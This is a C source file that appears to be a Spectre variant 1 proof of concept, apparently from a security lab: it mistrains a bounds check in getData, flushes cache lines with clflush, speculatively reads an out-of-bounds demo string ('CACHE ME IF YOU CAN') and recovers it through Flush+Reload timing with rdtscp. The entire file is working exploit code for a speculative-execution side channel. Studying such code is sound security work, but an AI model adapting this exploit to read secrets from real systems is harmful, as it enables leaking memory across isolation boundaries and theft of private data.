#include <stdio.h>
#include <stdint.h>
#include <emmintrin.h>
#include <x86intrin.h>

#define CACHE_THRESHOLD (100)
#define DELTA 1024

unsigned int limitu = 9;
unsigned int limitl = 0;
uint8_t array[256 * 4096];
uint8_t data[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};
char *secret_token = "CACHE ME IF YOU CAN";
uint8_t temp;

void flushCache()
{

  int i;
  for (i = 0; i < 256; i++)
    array[i * 4096 + DELTA] = 1;

  for (i = 0; i < 256; i++)
    _mm_clflush(&array[i * 4096 + DELTA]);
}

void reloadCache()
{

  int junk = 0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;

  for (i = 0; i < 256; i++)
  {
    addr = &array[i * 4096 + DELTA];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 < CACHE_THRESHOLD && i != 0)
      printf("The secret %d was stored in cache, value: %c.\n", i, i);
  }
}

uint8_t getData(size_t x)
{

  if (x < limitu && x > limitl)
  {
    return data[x];
  }
  else
  {
    return 0;
  }
}

void spectreAttackAddress(size_t index)
{

  int i;
  int s;
  volatile int z;

  for (int i = 0; i < 10; i++)
    getData(i);

  _mm_clflush(&limitu);
  _mm_clflush(&limitl);
  for (i = 0; i < 256; i++)
    _mm_clflush(&array[i * 4096 + DELTA]);
  for (z = 0; z < 100; z++)
  {
  }
  usleep(10);

  s = getData(index);
  array[s * 4096 + DELTA] += 1;
}

int main()
{
  flushCache();
  size_t addr_token = (size_t)(secret_token - (char *)data);
  spectreAttackAddress(addr_token);
  reloadCache();
  return 0;
}
